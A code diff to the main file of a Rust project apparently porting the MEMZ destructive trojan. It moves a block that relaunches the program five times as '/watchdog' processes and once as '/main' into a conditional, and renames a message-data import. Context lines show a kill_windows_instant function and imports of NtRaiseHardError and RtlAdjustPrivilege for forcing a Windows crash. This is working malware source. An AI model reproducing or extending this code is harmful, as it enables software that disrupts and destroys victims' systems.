@@ -6,7 +6,7 @@ use ::log::{error, info};
 
 use memz_rs::{
     convert_str::ToPCSTRWrapper,
-    data::data::{MEMZ_MSGBOXA_1, MEMZ_MSGBOXA_2, MSGS},
+    data::msg::{MEMZ_MSGBOXA_1, MEMZ_MSGBOXA_2, MSGS},
     ntdll::{
         library::Library,
         ntdll_api::{NtRaiseHardErrorFn, RtlAdjustPrivilegeFn},
@@ -109,7 +109,7 @@ fn kill_windows_instant() -> Result<(), WinError> {
 
 fn main() -> Result<(), WinError> {
     log::new_log();
-    let res = Resolution::default();
+    let _res = Resolution::default();
     #[cfg(all(feature = "DEBUG_MODE", feature = "WATCHDOG"))]
     {
         let watchdog_thread = thread::spawn(watchdog_thread);
@@ -177,44 +177,45 @@ fn main() -> Result<(), WinError> {
         {
             process::exit(0);
         }
-    }
 
-    let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // alloc 8192 * 2
-    wrap_get_module_file_name(
-        HANDLE::default(),
-        HMODULE(8192_isize),
-        fn_buf.as_mut_slice(),
-    )?;
-
-    let path = std::str::from_utf8(&fn_buf).unwrap();
-
-    for _ in 0..5 {
-        wrap_shell_execute_a(
-            HWND(0),
-            PCSTR::null(),
-            *path.to_pcstr(),
-            *"/watchdog".to_pcstr(),
-            PCSTR::null(),
-            SW_SHOWDEFAULT,
+        let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // alloc 8192 * 2
+        wrap_get_module_file_name(
+            HANDLE::default(),
+            HMODULE(8192_isize),
+            fn_buf.as_mut_slice(),
         )?;
+
+        let path = std::str::from_utf8(&fn_buf).unwrap();
+
+        for _ in 0..5 {
+            wrap_shell_execute_a(
+                HWND(0),
+                PCSTR::null(),
+                *path.to_pcstr(),
+                *"/watchdog".to_pcstr(),
+                PCSTR::null(),
+                SW_SHOWDEFAULT,
+            )?;
+        }
+
+        let info = SHELLEXECUTEINFOA {
+            cbSize: size_of::<SHELLEXECUTEINFOA>() as u32,
+            fMask: SEE_MASK_NOCLOSEPROCESS,
+            hwnd: HWND(0),
+            lpVerb: PCSTR::null(),
+            lpFile: *path.to_pcstr(),
+            lpParameters: *"/main".to_pcstr(),
+            lpDirectory: PCSTR::null(),
+            nShow: SW_SHOWDEFAULT.0 as i32,
+            hInstApp: HMODULE(0),
+            ..Default::default()
+        };
+
+        wrap_set_priority_class(info.hProcess, HIGH_PRIORITY_CLASS.0)?;
+
+        process::exit(0);
     }
-
-    let info = SHELLEXECUTEINFOA {
-        cbSize: size_of::<SHELLEXECUTEINFOA>() as u32,
-        fMask: SEE_MASK_NOCLOSEPROCESS,
-        hwnd: HWND(0),
-        lpVerb: PCSTR::null(),
-        lpFile: *path.to_pcstr(),
-        lpParameters: *"/main".to_pcstr(),
-        lpDirectory: PCSTR::null(),
-        nShow: SW_SHOWDEFAULT.0 as i32,
-        hInstApp: HMODULE(0),
-        ..Default::default()
-    };
-
-    wrap_set_priority_class(info.hProcess, HIGH_PRIORITY_CLASS.0)?;
-
-    process::exit(0);
+    
 }
 
 #[cfg(all(feature = "DEBUG_MODE", feature = "WATCHDOG"))]
